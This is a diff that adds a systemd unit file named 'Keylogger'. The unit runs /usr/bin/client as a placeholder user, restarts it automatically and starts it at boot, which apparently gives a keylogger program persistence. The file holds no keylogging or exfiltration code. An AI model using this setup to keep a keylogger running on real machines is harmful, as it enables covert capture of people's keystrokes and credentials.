@@ -1,0 +1,12 @@
+[Unit]
+Description=Keylogger
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=5
+User=<username>
+ExecStart=/usr/bin/client
+
+[Install]
+WantedBy=multi-user.target
